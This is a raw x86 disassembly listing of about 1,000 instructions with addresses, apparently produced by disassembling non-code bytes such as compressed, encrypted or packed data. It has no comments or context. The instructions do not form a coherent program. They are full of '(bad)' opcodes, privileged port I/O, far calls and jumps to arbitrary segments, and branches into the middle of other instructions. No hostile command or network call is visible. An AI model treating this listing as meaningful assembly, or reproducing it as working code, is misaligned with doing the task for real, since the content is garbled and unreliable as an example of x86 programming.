  42402f:	xchg   ebx,eax
  424030:	mov    ch,0xa8
  424032:	dec    ebp
  424033:	ins    DWORD PTR es:[edi],dx
  424034:	xchg   esp,eax
  424035:	xchg   esp,eax
  424036:	out    dx,al
  424037:	iret   
  424038:	fnsave [ecx+eiz*4+0x43]
  42403c:	and    bl,BYTE PTR [esi]
  42403e:	cmp    ah,BYTE PTR [ecx+0x61e88506]
  424044:	fdivr  QWORD PTR [ebp-0x20]
  424047:	ficom  WORD PTR [edx+0x34]
  42404a:	fdiv   QWORD PTR [edi+0x5e]
  42404d:	mov    WORD PTR [edx-0x3a],ds
  424050:	int    0x83
  424052:	(bad)  
  424053:	mov    eax,ds:0xadb935d6
  424058:	add    BYTE PTR [esi],ah
  42405a:	mov    al,0x2a
  42405c:	cmp    BYTE PTR [esi+ebp*8],0xce
  424060:	sub    eax,0x668096a1
  424065:	pop    es
  424066:	and    ah,BYTE PTR [eax+0x5f88cdd2]
  42406c:	fdivrp st(6),st
  42406e:	pop    eax
  42406f:	xchg   ecx,eax
  424070:	stc    
  424071:	sub    dh,0x11
  424074:	pop    edx
  424075:	inc    ebp
  424076:	lahf   
  424077:	outs   dx,BYTE PTR ds:[esi]
  424078:	xor    BYTE PTR [edx],dh
  42407a:	sub    esp,DWORD PTR [ecx-0xd65b516]
  424080:	sbb    ebx,DWORD PTR [ebp+0x752ecdf]
  424086:	hlt    
  424087:	xchg   DWORD PTR [ebp+0x6c21a46b],esp
  42408d:	dec    ebx
  42408e:	not    DWORD PTR [edi+eax*4+0x60]
  424092:	jne    0x424049
  424094:	and    BYTE PTR [eax],dl
  424096:	sti    
  424097:	cmp    al,0xf0
  424099:	pop    ds
  42409a:	out    dx,al
  42409b:	lahf   
  42409c:	icebp  
  42409d:	les    ebx,FWORD PTR [esi+0x6]
  4240a0:	in     eax,dx
  4240a1:	repz or cl,BYTE PTR [edi-0x17b769c9]
  4240a8:	or     cl,BYTE PTR [ebp+0x20fc5175]
  4240ae:	shl    cl,1
  4240b0:	pop    ebp
  4240b1:	clc    
  4240b2:	imul   edx,DWORD PTR [ebp+esi*4+0x6e18df5f],0x22
  4240ba:	mov    eax,ss:0x2cfaff30
  4240c0:	jge    0x424057
  4240c2:	scas   al,BYTE PTR es:[edi]
  4240c3:	and    eax,0xd5858d5d
  4240c8:	sub    BYTE PTR [eax-0x17],cl
  4240cb:	jecxz  0x424057
  4240cd:	fsubr  DWORD PTR ds:0x8d193285
  4240d3:	push   esi
  4240d4:	pop    esi
  4240d5:	test   BYTE PTR [eax+0x6e02d81e],cl
  4240db:	mov    ah,BYTE PTR [edi+ebp*1+0x38]
  4240df:	sbb    al,0x2e
  4240e1:	sub    DWORD PTR [ecx],0xe1fd7c8d
  4240e7:	mov    al,ds:0xa9db71e
  4240ec:	dec    eax
  4240ed:	je     0x42412b
  4240ef:	test   DWORD PTR [esi-0x75],ebx
  4240f2:	mov    al,0x29
  4240f4:	stos   DWORD PTR es:[edi],eax
  4240f5:	push   ss
  4240f6:	pop    edi
  4240f7:	icebp  
  4240f8:	push   esp
  4240f9:	sub    ch,BYTE PTR [edx-0x5f]
  4240fc:	loop   0x42417c
  4240fe:	ja     0x424095
  424100:	adc    dl,BYTE PTR [edi-0x10]
  424103:	rcr    BYTE PTR [esi+0x14],1
  424106:	fist   DWORD PTR [eax]
  424108:	ss and eax,0x605dc40e
  42410e:	push   ecx
  42410f:	push   ds
  424110:	xlat   BYTE PTR ds:[ebx]
  424111:	jle    0x424187
  424113:	pop    ss
  424114:	sbb    eax,DWORD PTR [ecx+0x4b5e6a52]
  42411a:	or     dl,BYTE PTR [ecx-0x5b797187]
  424120:	jl     0x424181
  424122:	stos   BYTE PTR es:[edi],al
  424123:	push   es
  424124:	jbe    0x424168
  424126:	test   eax,0xdd808aeb
  42412b:	cmp    cl,BYTE PTR [eax-0x736811bd]
  424131:	imul   edx,DWORD PTR [eax-0x8],0x3c
  424135:	lods   al,BYTE PTR ds:[esi]
  424136:	mov    DWORD PTR [eax+esi*2+0x582935bb],esp
  42413d:	mov    bh,BYTE PTR [edi+edx*8+0x1e]
  424141:	adc    eax,DWORD PTR [eax+0x4e]
  424144:	pop    esi
  424145:	(bad)  [ebx+eiz*8]
  424148:	adc    bl,BYTE PTR [esi-0x78]
  42414b:	outs   dx,DWORD PTR ss:[esi]
  42414d:	push   edx
  42414e:	adc    ah,0xc8
  424151:	ror    DWORD PTR [edi+0x43d21e28],0x1e
  424158:	or     BYTE PTR [edi],dl
  42415a:	mov    dl,0x74
  42415c:	or     ah,BYTE PTR [eax-0x76]
  42415f:	cmp    DWORD PTR [ecx+0x725a22b3],esi
  424165:	sbb    al,0x38
  424167:	mov    eax,ds:0x3bfe3cd0
  42416c:	daa    
  42416d:	mov    dh,0xbd
  42416f:	dec    eax
  424170:	pop    esi
  424171:	xchg   esi,eax
  424172:	mov    edi,0x2702b8d
  424177:	gs loope 0x4241d9
  42417a:	adc    eax,0xf09eed84
  42417f:	cli    
  424180:	xchg   ebp,eax
  424181:	cwde   
  424182:	adc    BYTE PTR [eax+0x2d01cb5e],ch
  424188:	std    
  424189:	mov    al,ds:0x60bc2517
  42418e:	jp     0x424197
  424190:	ret    
  424191:	cmp    BYTE PTR [edi-0x110a7178],ch
  424197:	out    dx,al
  424198:	test   DWORD PTR [esi-0x35],ecx
  42419b:	and    BYTE PTR [eax-0x605f57cb],ch
  4241a1:	jl     0x424172
  4241a3:	scas   ax,WORD PTR es:[edi]
  4241a5:	xchg   DWORD PTR [eax+0x27],edx
  4241a8:	jbe    0x42416f
  4241aa:	out    0x92,eax
  4241ac:	(bad)  
  4241ad:	sbb    al,0x90
  4241af:	and    ebx,esi
  4241b1:	mov    esi,0x606aba82
  4241b6:	cs nop
  4241b8:	addr16 out 0x38,al
  4241bb:	loopne 0x42419b
  4241bd:	pop    ds
  4241be:	and    eax,0x6e16138
  4241c3:	cmpxchg BYTE PTR [eax+0x2c],ch
  4241c7:	or     ecx,0x8
  4241ca:	pop    eax
  4241cb:	(bad)  
  4241cc:	pop    esi
  4241cd:	fdiv   DWORD PTR [ecx]
  4241cf:	adc    esi,DWORD PTR [ebx-0x57]
  4241d2:	push   ebp
  4241d3:	lods   al,BYTE PTR ds:[esi]
  4241d4:	pop    esi
  4241d5:	sub    ecx,edi
  4241d7:	loope  0x42423f
  4241d9:	rol    esp,0xaf
  4241dc:	adc    DWORD PTR [edx-0x3a],0xce363e44
  4241e3:	jle    0x42416c
  4241e5:	fadd   QWORD PTR [edx+0x75a55e28]
  4241eb:	or     dh,bl
  4241ed:	icebp  
  4241ee:	inc    eax
  4241ef:	and    esp,esp
  4241f1:	pusha  
  4241f2:	ror    DWORD PTR [edi+eiz*8+0x30],0xce
  4241f7:	and    dl,ch
  4241f9:	dec    ebp
  4241fa:	add    DWORD PTR [ecx+ecx*4+0x53],ebx
  4241fe:	scas   al,BYTE PTR es:[edi]
  4241ff:	inc    edx
  424200:	or     BYTE PTR [ebx],ah
  424202:	and    ebx,edi
  424204:	ds popa 
  424206:	pop    ebp
  424207:	xor    eax,0x80fe0515
  42420c:	sbb    bl,BYTE PTR [eax]
  42420e:	xlat   BYTE PTR ds:[ebx]
  42420f:	mov    edx,0xa82146f1
  424214:	lds    ebp,FWORD PTR es:[esi+ebp*2+0x1ffcfde4]
  42421c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42421d:	add    bh,dh
  42421f:	data16 jmp 0x4241a3
  424222:	test   BYTE PTR [ecx-0x7f4d26d7],ah
  424228:	cmp    esi,ebp
  42422a:	nop
  42422b:	push   esp
  42422c:	pop    edi
  42422d:	retf   0x3c97
  424230:	and    bh,ch
  424232:	xor    dh,BYTE PTR [ecx-0x68]
  424235:	popa   
  424236:	retf   0xa4a0
  424239:	lahf   
  42423a:	adc    al,0xc2
  42423c:	push   0x63cc312d
  424241:	sbb    bl,BYTE PTR [ebx+0x42]
  424244:	aam    0x5d
  424246:	fcomp  DWORD PTR [ebx]
  424248:	and    bh,BYTE PTR [ecx+0x60dd4d54]
  42424e:	xlat   BYTE PTR gs:[ebx]
  424250:	mov    edi,0x7ccef10d
  424255:	mov    ecx,0x1f6acddf
  42425a:	and    dh,dl
  42425c:	jmp    0x42423b
  42425e:	cmp    eax,0x2b46697
  424263:	pusha  
  424264:	sahf   
  424265:	and    ah,al
  424267:	into   
  424268:	out    dx,eax
  424269:	pusha  
  42426a:	lds    esp,FWORD PTR [eax+edi*4+0x64]
  42426e:	ss ret 
  424270:	push   edi
  424271:	fsubp  st(6),st
  424273:	int3   
  424274:	pop    ebp
  424275:	sbb    dh,0x32
  424278:	jle    0x4242a1
  42427a:	and    eax,0xb6beaa1
  42427f:	pop    ds
  424280:	fucomp st(7)
  424282:	fstp   QWORD PTR gs:[esi+0x7c]
  424286:	sbb    al,0x13
  424288:	enter  0xd517,0x22
  42428c:	punpcklwd mm2,mm2
  42428f:	inc    ebp
  424290:	inc    ebx
  424291:	sbb    eax,DWORD PTR [esi]
  424293:	js     0x424257
  424295:	std    
  424296:	dec    edx
  424297:	(bad)  
  424298:	pop    esi
  424299:	xchg   edi,eax
  42429a:	add    BYTE PTR [ecx+eiz*8],ch
  42429d:	arpl   WORD PTR ds:0x446125e6,si
  4242a3:	xchg   ebp,eax
  4242a4:	jl     0x4242cd
  4242a6:	hlt    
  4242a7:	and    esp,DWORD PTR [ebp+0x40]
  4242aa:	out    dx,al
  4242ab:	jae    0x424293
  4242ad:	leave  
  4242ae:	pop    ebp
  4242af:	push   esi
  4242b0:	call   0x6dd0:0x798eda25
  4242b7:	loope  0x4242a9
  4242b9:	js     0x424320
  4242bb:	jp     0x42433c
  4242bd:	adc    esi,eax
  4242bf:	aam    0xc7
  4242c1:	cmp    eax,0x5e32c0af
  4242c6:	into   
  4242c7:	xor    eax,0x1c955a27
  4242cc:	clc    
  4242cd:	dec    edx
  4242ce:	stc    
  4242cf:	mov    al,ds:0xe41b5eda
  4242d4:	pop    ebp
  4242d5:	stc    
  4242d6:	pop    eax
  4242d7:	xor    eax,0x21b7eb61
  4242dc:	ds shl bl,0xa0
  4242e0:	push   esi
  4242e1:	xchg   edx,eax
  4242e2:	iret   
  4242e3:	sbb    dh,BYTE PTR [edx+0x5eaf3a85]
  4242e9:	xchg   ecx,eax
  4242ea:	shr    ch,1
  4242ec:	loope  0x42431b
  4242ee:	test   al,0x98
  4242f0:	inc    ecx
  4242f1:	pop    edi
  4242f2:	bsf    esi,DWORD PTR [eax]
  4242f5:	adc    eax,ebp
  4242f7:	cmp    bh,BYTE PTR [esi-0x3]
  4242fa:	ret    
  4242fb:	dec    ecx
  4242fc:	pop    esi
  4242fd:	push   esp
  4242fe:	hlt    
  4242ff:	pop    edi
  424300:	and    al,0x2f
  424302:	mov    ch,0x64
  424304:	frstor [edx-0x24345f54]
  42430a:	stos   BYTE PTR es:[edi],al
  42430b:	sbb    al,0xe8
  42430d:	mov    bl,0xf1
  42430f:	cmp    DWORD PTR [esi+0x51],ebx
  424312:	pinsrw mm2,WORD PTR [ebx-0x69],0x38
  424317:	icebp  
  424318:	(bad)  
  424319:	pusha  
  42431a:	inc    edx
  42431b:	loopne 0x424348
  42431d:	ret    0x48f4
  424320:	idiv   DWORD PTR [ecx]
  424322:	out    0xc,eax
  424324:	or     DWORD PTR [edi+0x84ef520],eax
  42432a:	sbb    ch,BYTE PTR ds:0x133c6142
  424330:	retf   
  424331:	arpl   WORD PTR [esi],bp
  424333:	popf   
  424334:	int3   
  424335:	shr    dh,0x9d
  424338:	adc    DWORD PTR ds:0xd511f80d,0xffffff93
  42433f:	fnstsw WORD PTR [eax+0x1443eeae]
  424345:	shl    BYTE PTR [edx+edx*4-0x4d],cl
  424349:	and    eax,0x6130a220
  42434e:	clc    
  42434f:	xor    DWORD PTR [esi+0x71],edi
  424352:	adc    BYTE PTR [edi-0x5c7d9efb],bl
  424358:	ja     0x4242ea
  42435a:	add    BYTE PTR [eax+esi*4-0x7c],0xe7
  42435f:	mov    ebp,0x3bdf53b2
  424364:	aad    0x60
  424366:	scas   al,BYTE PTR es:[edi]
  424367:	add    al,0xe4
  424369:	pop    ss
  42436a:	xor    eax,0xe7e433a1
  42436f:	nop
  424370:	leave  
  424371:	or     dh,BYTE PTR [ebx-0x74bea2f4]
  424377:	pop    ss
  424378:	sub    edx,esp
  42437a:	(bad)  
  42437b:	ss push 0x47
  42437e:	popf   
  42437f:	test   al,0x78
  424381:	adc    dh,BYTE PTR [ebp-0x4d]
  424384:	leave  
  424385:	nop
  424386:	icebp  
  424387:	lock mov ?,WORD PTR [eax+0x5a]
  42438b:	fistp  DWORD PTR [esi+0x74]
  42438e:	jae    0x4243dc
  424390:	dec    ebx
  424391:	pop    esi
  424392:	sbb    bh,ch
  424394:	(bad)  
  424395:	pusha  
  424396:	jecxz  0x4243c5
  424398:	xchg   DWORD PTR [ecx],ebp
  42439a:	push   edi
  42439b:	dec    edx
  42439c:	cdq    
  42439d:	mov    al,0xfc
  42439f:	adc    DWORD PTR [ebx],edi
  4243a1:	xchg   ecx,eax
  4243a2:	in     eax,dx
  4243a3:	outs   dx,DWORD PTR ds:[esi]
  4243a4:	cs sbb eax,0x767aad78
  4243aa:	aaa    
  4243ab:	mov    eax,ds:0xfc2ddb4f
  4243b0:	cwde   
  4243b1:	jmp    0x2da02c32
  4243b6:	cld    
  4243b7:	ret    0xd6c
  4243ba:	imul   ebp,DWORD PTR [edi+0x6e],0x5
  4243be:	mov    ebp,DWORD PTR [ebx-0x62119a9a]
  4243c4:	int3   
  4243c5:	adc    eax,0xb2c7e0d9
  4243ca:	out    dx,al
  4243cb:	sub    BYTE PTR [edx],cl
  4243cd:	clc    
  4243ce:	nop
  4243cf:	ins    DWORD PTR es:[edi],dx
  4243d0:	mov    ch,0x5e
  4243d2:	call   0xe2e8:0xd6becba1
  4243d9:	jnp    0x4243bc
  4243db:	dec    edx
  4243dc:	pop    esi
  4243dd:	mov    esp,0x85750e86
  4243e2:	xchg   edi,eax
  4243e3:	aas    
  4243e4:	aam    0x5d
  4243e6:	(bad)  
  4243e8:	dec    eax
  4243e9:	push   ebp
  4243ea:	mov    bl,ah
  4243ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243ed:	adc    bl,BYTE PTR [ebp+0x1]
  4243f0:	pop    esi
  4243f1:	sbb    DWORD PTR [eax-0x6bdf9b7b],edi
  4243f7:	aaa    
  4243f8:	push   edx
  4243f9:	inc    esp
  4243fa:	push   edx
  4243fb:	fmul   QWORD PTR [ecx+0x1e]
  4243fe:	repz scas eax,DWORD PTR es:[edi]
  424400:	(bad)  
  424401:	retf   0xd6ee
  424404:	ss add al,0xdf
  424407:	jne    0x4243a0
  424409:	and    al,0xd3
  42440b:	mov    al,ds:0x20810540
  424410:	inc    ecx
  424411:	push   ss
  424412:	fstp   TBYTE PTR [edx+0x31a445b]
  424418:	jnp    0x424405
  42441a:	fiadd  WORD PTR [ebp+0x16]
  42441d:	stos   DWORD PTR es:[edi],eax
  42441e:	outs   dx,DWORD PTR es:[esi]
  424420:	and    BYTE PTR [eax+0x3a],0x25
  424424:	jno    0x4243cc
  424426:	and    esi,DWORD PTR [ebp-0x6a]
  424429:	push   ecx
  42442a:	loope  0x4243cf
  42442c:	pop    esi
  42442d:	dec    ebp
  42442e:	sub    al,0xeb
  424430:	or     ch,ch
  424432:	pop    ecx
  424433:	pop    ebp
  424434:	lods   al,BYTE PTR ds:[esi]
  424435:	pusha  
  424436:	rcl    BYTE PTR [eax-0x65425269],0xc2
  42443d:	lock out dx,al
  42443f:	dec    esi
  424440:	mul    DWORD PTR [ecx+eiz*1]
  424443:	pop    esp
  424444:	dec    edx
  424445:	jmp    0xc67de5eb
  42444a:	or     esi,DWORD PTR [edx-0x5298c0b8]
  424450:	pop    esi
  424451:	imul   esi,esi,0xa096ecc5
  424457:	mov    bl,0x60
  424459:	pop    esi
  42445a:	call   0x925a1edd
  42445f:	xor    BYTE PTR [esi+0x3b],ch
  424462:	xchg   BYTE PTR fs:[esi-0x3b],bl
  424466:	cld    
  424467:	push   esp
  424468:	jl     0x4243eb
  42446a:	xchg   esi,eax
  42446b:	add    ebx,DWORD PTR [edi+0x61]
  42446e:	mov    eax,DWORD PTR [ebp+ebx*4+0x4d2281e9]
  424475:	ja     0x424465
  424477:	push   esi
  424478:	push   esi
  424479:	outs   dx,BYTE PTR ds:[esi]
  42447a:	pop    eax
  42447b:	mov    ds:0xa0c9485c,al
  424480:	outs   dx,DWORD PTR ds:[esi]
  424481:	mov    esi,0xdef1b8bf
  424486:	sbb    eax,0x843135ce
  42448b:	mov    eax,ds:0x568f1e9d
  424490:	je     0x424499
  424492:	mov    ch,0x9b
  424494:	ror    dh,0x90
  424497:	pop    esp
  424498:	ficom  WORD PTR ds:0x359495a5
  42449e:	in     eax,dx
  42449f:	xchg   esi,eax
  4244a0:	cmp    al,0x43
  4244a2:	call   0xe5ac:0xed48730
  4244a9:	pop    ecx
  4244aa:	int3   
  4244ab:	test   al,0x74
  4244ad:	fist   WORD PTR [ecx]
  4244af:	mov    eax,ds:0xcd57bbf2
  4244b4:	ss repz or eax,0x3db934ea
  4244bb:	je     0x42451b
  4244bd:	sub    dl,al
  4244bf:	call   0x12a21fe1
  4244c4:	ja     0x4244ce
  4244c6:	dec    edx
  4244c7:	dec    edi
  4244c8:	pop    esi
  4244c9:	inc    edi
  4244ca:	cmp    al,0x7c
  4244cc:	dec    edi
  4244cd:	(bad)  
  4244ce:	push   ecx
  4244cf:	adc    eax,0x79f6e251
  4244d4:	xchg   bl,ch
  4244d6:	out    dx,al
  4244d7:	loope  0x42451e
  4244d9:	call   0x9838bf9e
  4244de:	push   esi
  4244df:	rcr    DWORD PTR [ebp-0x78],1
  4244e2:	xlat   BYTE PTR ds:[ebx]
  4244e3:	mov    al,ds:0x235aa7e4
  4244e8:	repz jb 0x424554
  4244eb:	rcr    BYTE PTR [edi-0x76],cl
  4244ee:	enter  0x5fe3,0xd6
  4244f2:	push   ecx
  4244f3:	popa   
  4244f4:	nop
  4244f5:	or     DWORD PTR [ebp-0x5f],0x75
  4244f9:	push   esi
  4244fa:	pop    ecx
  4244fb:	shr    DWORD PTR [eax+ebp*8-0x1f],cl
  4244ff:	xor    DWORD PTR [ebx],esi
  424501:	sbb    dl,BYTE PTR [eax]
  424503:	and    esi,eax
  424505:	aam    0x61
  424507:	mov    dl,0x32
  424509:	leave  
  42450a:	mov    ebp,DWORD PTR [eax-0x15de7c1c]
  424510:	adc    al,0xf1
  424512:	or     ebx,DWORD PTR [ecx-0x261202d2]
  424518:	gs or  eax,0x6028b97e
  42451e:	ss xchg esi,eax
  424520:	leave  
  424521:	pusha  
  424522:	cld    
  424523:	fcmovnb st,st(4)
  424525:	sbb    eax,0xf84cfeb8
  42452a:	out    dx,al
  42452b:	inc    esi
  42452c:	cmp    al,0x7a
  42452e:	jbe    0x4244da
  424530:	cld    
  424531:	push   ss
  424532:	std    
  424533:	jmp    0xa1a76edf
  424538:	dec    ebx
  424539:	sbb    ch,BYTE PTR [ebx]
  42453b:	nop
  42453c:	das    
  42453d:	mov    ss,WORD PTR [edx-0x76]
  424540:	pop    esi
  424541:	and    al,0x37
  424543:	imul   edi,DWORD PTR [edi+0x65],0x79
  424547:	fdiv   DWORD PTR [eax+0x60]
  42454a:	cmp    bl,BYTE PTR [ecx]
  42454c:	fwait
  42454d:	add    ah,BYTE PTR [esi]
  42454f:	cwde   
  424550:	adc    eax,0x4d1ff54c
  424555:	mov    ebx,0xbc52a4a1
  42455a:	mov    al,ds:0x87c0bf71
  42455f:	or     DWORD PTR [edx],ebx
  424561:	popa   
  424562:	sub    cl,BYTE PTR [eax]
  424564:	mov    edx,0x9228c26d
  424569:	(bad)  
  42456a:	out    0xed,al
  42456c:	pop    esi
  42456d:	jmp    edx
  42456f:	push   ebp
  424570:	iret   
  424571:	jmp    0x618b479c
  424576:	adc    BYTE PTR [ebx],ah
  424578:	cmp    eax,0x5a7f25d6
  42457d:	call   0x219e5f69
  424582:	fstp   st(6)
  424584:	mov    esi,0x15883ddf
  424589:	popa   
  42458a:	adc    al,0x4d
  42458c:	jge    0x4245c9
  42458e:	(bad)  
  42458f:	mov    ah,0xfb
  424591:	js     0x424581
  424593:	test   al,0xcf
  424595:	imul   edx,DWORD PTR [eax],0xffffffde
  424598:	daa    
  424599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42459a:	pop    eax
  42459b:	mov    eax,ds:0x976b604
  4245a0:	mov    ecx,DWORD PTR [esi]
  4245a2:	cwde   
  4245a3:	bound  ebx,QWORD PTR [esi-0x11]
  4245a6:	ins    DWORD PTR es:[edi],dx
  4245a7:	aas    
  4245a8:	xchg   edx,eax
  4245a9:	ret    0x4c95
  4245ac:	cmp    al,0x5
  4245ae:	outs   dx,DWORD PTR ds:[esi]
  4245af:	push   esi
  4245b0:	pop    esi
  4245b1:	std    
  4245b2:	leave  
  4245b3:	adc    bl,BYTE PTR [edx+edx*1-0x1b]
  4245b7:	jl     0x4245eb
  4245b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245ba:	xor    al,0xa1
  4245bc:	dec    esi
  4245bd:	outs   dx,BYTE PTR ds:[esi]
  4245be:	dec    edx
  4245bf:	add    edi,ebx
  4245c1:	cs xchg esi,eax
  4245c3:	mov    eax,ds:0x80b60b9d
  4245c8:	out    dx,al
  4245c9:	(bad)  
  4245ca:	mov    edx,0x21e0e97d
  4245cf:	sub    al,0xb6
  4245d1:	pop    edi
  4245d2:	xor    eax,0x10092e18
  4245d7:	mov    ch,0x6a
  4245d9:	xchg   esi,edx
  4245db:	stos   DWORD PTR es:[edi],eax
  4245dc:	mov    gs,WORD PTR ds:0x59a3edee
  4245e2:	test   eax,0xee4ef202
  4245e7:	hlt    
  4245e8:	in     eax,0x85
  4245ea:	mov    edx,0x6465c62d
  4245ef:	mov    eax,ds:0xd209499
  4245f4:	cmp    BYTE PTR [ebx-0xaa14dd0],al
  4245fa:	es inc ecx
  4245fc:	out    dx,al
  4245fd:	and    eax,0x60dfaa27
  424602:	add    eax,0xd95f9271
  424607:	arpl   si,di
  424609:	sbb    al,0xee
  42460b:	or     BYTE PTR [eax],bl
  42460d:	call   DWORD PTR [esi]
  42460f:	push   ebp
  424610:	call   0x66ed133a
  424615:	pop    edx
  424616:	sub    DWORD PTR [esi],0xf84b1e35
  42461c:	fst    DWORD PTR [ebp+0x3a34dd86]
  424622:	out    0xfe,eax
  424624:	in     eax,dx
  424625:	ins    DWORD PTR es:[edi],dx
  424626:	sub    eax,0xc1ec9e56
  42462b:	mov    ds:0x77226085,eax
  424630:	dec    DWORD PTR [esi+0x75]
  424633:	sbb    al,0x55
  424635:	es jmp 0x92175085
  42463b:	mov    ds:0x7d7be79e,al
  424640:	inc    esp
  424641:	sbb    DWORD PTR [ebx+0x236e5e63],ebp
  424647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424648:	enter  0x8137,0xd8
  42464c:	ss pop ds
  42464e:	or     al,0x2f
  424650:	fiadd  WORD PTR [edx+0x73]
  424653:	ret    0xb891
  424656:	scas   al,BYTE PTR es:[edi]
  424657:	dec    eax
  424658:	mov    ds:0xf77dc82a,al
  42465d:	pusha  
  42465e:	test   DWORD PTR [ebx],ecx
  424660:	(bad)  
  424662:	inc    ebx
  424663:	inc    esi
  424664:	scas   eax,DWORD PTR es:[edi]
  424665:	xor    eax,0x618eade7
  42466a:	dec    ebx
  42466b:	mov    ch,0x3e
  42466d:	ja     0x42469d
  42466f:	cmp    esp,DWORD PTR [eax+0x61]
  424672:	outs   dx,DWORD PTR ds:[esi]
  424673:	inc    ebp
  424674:	retf   
  424675:	repnz jecxz 0x424602
  424678:	mov    ss:0x1a9286ee,al
  42467e:	ret    
  42467f:	xchg   ecx,eax
  424680:	xor    dh,BYTE PTR [ecx+0x10fca181]
  424686:	inc    edi
  424687:	ret    0x8ba3
  42468a:	xor    DWORD PTR [ebx+0x36a6d2e],0x7d
  424691:	xchg   edx,edx
  424693:	jb     0x424698
  424695:	popa   
  424696:	jmp    0x3cdb:0x2eeb1611
  42469d:	frstor ss:[edx]
  4246a0:	pop    esi
  4246a1:	inc    ebp
  4246a2:	mov    ebp,0x583831c3
  4246a7:	mov    bl,0xbf
  4246a9:	mov    ds:0x5155a156,al
  4246ae:	in     eax,dx
  4246af:	mov    edx,DWORD PTR [eax+0x26b9b965]
  4246b5:	mov    ch,0x54
  4246b7:	mov    eax,ds:0xb79bdfa8
  4246bc:	push   esi
  4246bd:	xchg   ebx,eax
  4246be:	hlt    
  4246bf:	test   BYTE PTR [ebx+0x2e445c5e],dh
  4246c5:	jecxz  0x424715
  4246c7:	or     eax,0xd1eff97e
  4246cc:	pop    esi
  4246cd:	dec    ebp
  4246ce:	fs jo  0x42471f
  4246d1:	stos   DWORD PTR es:[edi],eax
  4246d2:	scas   al,BYTE PTR es:[edi]
  4246d3:	push   ecx
  4246d4:	pushf  
  4246d5:	bound  esp,QWORD PTR [ebp+0x6d545e92]
  4246db:	push   ebx
  4246dc:	jecxz  0x4246dd
  4246de:	dec    ecx
  4246df:	fldl2e 
  4246e1:	xchg   ebx,eax
  4246e2:	out    dx,al
  4246e3:	shl    cl,1
  4246e5:	lea    ebx,[ecx]
  4246e7:	lods   eax,DWORD PTR ds:[esi]
  4246e8:	ret    0x3814
  4246eb:	test   DWORD PTR [eax],edi
  4246ed:	(bad)  
  4246ee:	cmp    al,0xa8
  4246f0:	pop    esp
  4246f1:	and    BYTE PTR [ebp*8+0x78ee2324],al
  4246f8:	sbb    al,0x27
  4246fa:	sahf   
  4246fb:	push   es
  4246fc:	jl     0x424699
  4246fe:	in     eax,dx
  4246ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424700:	nop
  424701:	push   esp
  424702:	push   cs
  424703:	inc    edi
  424704:	ins    DWORD PTR es:[edi],dx
  424705:	lahf   
  424706:	push   ds
  424707:	shr    DWORD PTR [ecx+0x37656c59],cl
  42470d:	add    DWORD PTR [edi+0x41],ebp
  424710:	into   
  424711:	fdiv   QWORD PTR ds:0x24cc5ec5
  424717:	idiv   DWORD PTR [edx+0x22095e81]
  42471d:	pop    edi
  42471e:	dec    ebp
  42471f:	inc    eax
  424720:	pop    esp
  424721:	loop   0x4246d2
  424723:	dec    ebx
  424724:	push   ds
  424725:	clc    
  424726:	rol    bl,0x5e
  424729:	into   
  42472a:	leave  
  42472b:	imul   ebp,ecx,0xffffffc2
  42472e:	xchg   esp,eax
  42472f:	arpl   WORD PTR [eax+eiz*2-0x4a3667b9],ax
  424736:	push   es
  424737:	inc    esp
  424738:	inc    esi
  424739:	js     0x42472a
  42473b:	and    DWORD PTR [eax-0x80],esi
  42473e:	arpl   WORD PTR [ecx-0x6a23a054],sp
  424744:	sub    esp,DWORD PTR [ecx+0x3d]
  424747:	jo     0x424785
  424749:	sub    esp,eax
  42474b:	imul   edx
  42474d:	dec    ecx
  42474e:	out    dx,al
  42474f:	stos   DWORD PTR es:[edi],eax
  424750:	inc    ecx
  424751:	adc    bh,BYTE PTR [ebx+0x77]
  424754:	cld    
  424755:	sub    DWORD PTR [eax-0x403b3e05],0xffffffa0
  42475c:	push   es
  42475d:	push   0xffffffab
  42475f:	in     al,dx
  424760:	cmp    BYTE PTR [ecx+0x1d],ah
  424763:	fcmovne st,st(6)
  424765:	push   cs
  424766:	out    0xac,al
  424768:	in     al,0x98
  42476a:	out    dx,al
  42476b:	cs inc ecx
  42476d:	mov    BYTE PTR [esp+esi*8],ch
  424770:	fs in  al,0xdc
  424773:	lods   al,BYTE PTR ds:[esi]
  424774:	ja     0x424735
  424776:	outs   dx,BYTE PTR ds:[esi]
  424777:	inc    ebp
  424778:	mov    ebp,0xd36dbf17
  42477d:	pop    edx
  42477e:	out    dx,al
  42477f:	fidivr WORD PTR [edi+0x6956d26e]
  424785:	mov    es,WORD PTR [edx-0x5f]
  424788:	out    0xcd,al
  42478a:	mov    esi,0x255d94ca
  42478f:	add    eax,0xb818095e
  424794:	and    DWORD PTR [ecx+edi*1],esp
  424797:	js     0x42479c
  424799:	inc    edx
  42479a:	lea    ecx,[ebx]
  42479c:	fstp   st(6)
  42479e:	outs   dx,BYTE PTR ds:[esi]
  42479f:	sbb    dl,ch
  4247a1:	xchg   DWORD PTR [edx-0x20],esp
  4247a4:	pop    esi
  4247a5:	dec    esp
  4247a6:	add    al,0x9b
  4247a8:	aam    0xcf
  4247aa:	or     BYTE PTR [ebx-0x43],dh
  4247ad:	pusha  
  4247ae:	xchg   DWORD PTR [edx+ebp*4+0x40],esi
  4247b2:	dec    ebx
  4247b3:	dec    DWORD PTR [esi-0x46]
  4247b6:	out    dx,al
  4247b7:	xchg   ebp,eax
  4247b8:	ins    BYTE PTR es:[edi],dx
  4247b9:	sbb    al,0x39
  4247bb:	mov    esp,0xa11ee8ec
  4247c0:	mov    ebp,0xd4c6b105
  4247c5:	repz shl ecx,0x64
  4247c9:	sbb    esi,DWORD PTR [ecx-0x45]
  4247cc:	mov    ds:0xa3dcad39,al
  4247d1:	add    ch,bh
  4247d3:	clc    
  4247d4:	push   ss
  4247d5:	in     al,0x37
  4247d7:	imul   esi,DWORD PTR [esi+0x60],0xffffffc9
  4247db:	xor    DWORD PTR [esp+esi*1-0x6c0762c],esi
  4247e2:	out    dx,al
  4247e3:	in     eax,0xfc
  4247e5:	inc    esi
  4247e6:	fisubr DWORD PTR [ecx-0x33]
  4247e9:	and    BYTE PTR [eax],dh
  4247eb:	mov    eax,ds:0x445b8cdf
  4247f0:	dec    ebx
  4247f1:	push   ebp
  4247f2:	mov    bh,0x64
